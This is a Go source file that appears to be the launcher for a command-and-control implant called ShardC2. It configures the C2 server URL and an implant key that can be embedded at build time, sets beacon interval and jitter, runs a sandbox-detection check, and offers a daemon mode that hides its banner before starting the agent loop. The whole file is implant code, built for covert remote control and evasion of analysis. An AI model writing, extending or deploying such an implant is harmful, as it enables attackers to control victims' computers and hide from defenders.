package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/shardc2/shardc2/internal/agent"
)

var (
	buildServerURL  string
	buildImplantKey string
)

func main() {
	var (
		serverURL  = flag.String("server", envOrDefault("SHARDC2_SERVER", buildServerURL), "C2 server URL")
		implantKey = flag.String("implant-key", envOrDefault("SHARDC2_IMPLANT_KEY", buildImplantKey), "Implant authentication key")
		caCert     = flag.String("ca-cert", "", "CA certificate for TLS verification")
		interval   = flag.Duration("interval", 5*time.Minute, "Beacon interval")
		jitter     = flag.Duration("jitter", 60*time.Second, "Max beacon jitter")
		daemon     = flag.Bool("daemon", false, "Run in daemon mode (suppress banner)")
	)
	flag.Parse()

	if !*daemon {
		fmt.Println("[*] ShardC2 Agent starting...")
	}

	if *serverURL == "" {
		log.Fatal("[-] Server URL required (--server or SHARDC2_SERVER)")
	}
	if *implantKey == "" {
		log.Fatal("[-] Implant key required (--implant-key or SHARDC2_IMPLANT_KEY)")
	}

	indicators := agent.CheckSandbox()
	if indicators.IsSuspicious() {
		log.Printf("[!] Sandbox indicators detected (%d suspicious)", indicators.Suspicious)
	}

	cfg := agent.Config{
		ServerURL:  *serverURL,
		ImplantKey: *implantKey,
		CACert:     *caCert,
		Interval:   *interval,
		Jitter:     *jitter,
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-quit
		log.Println("[*] Signal received, shutting down...")
		cancel()
	}()

	a := agent.New(cfg)
	if err := a.Run(ctx); err != nil && ctx.Err() == nil {
		log.Fatalf("[-] Agent error: %v", err)
	}
}

func envOrDefault(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}
